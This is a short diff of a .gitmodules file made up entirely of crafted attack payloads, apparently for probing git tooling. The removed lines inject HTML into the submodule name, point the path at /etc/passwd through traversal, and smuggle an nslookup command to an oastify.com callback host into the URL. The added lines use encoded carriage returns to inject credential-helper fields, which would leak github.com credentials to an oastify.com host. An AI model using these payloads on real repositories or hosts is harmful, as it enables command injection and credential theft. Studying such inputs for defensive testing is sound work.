@@ -1,3 +1,3 @@
-[submodule "Leaked-Credentials\"><h1>pwn"]
-	path = ../../../../../../../etc/passwd
-	url = https://evil.com/aa;nslookup xjkjkkmt8gw7ndj9xc6i4lzscjia61apz.oastify.com;#
+[submodule "Leaked-Credentials"]
+	path = Leaked-Credentials
+	url = http://%0dprotocol=https%0dhost=github.com%0d@7fntgui34qshjnfjtm2s0vv28tek2ct0i.oastify.com:80/
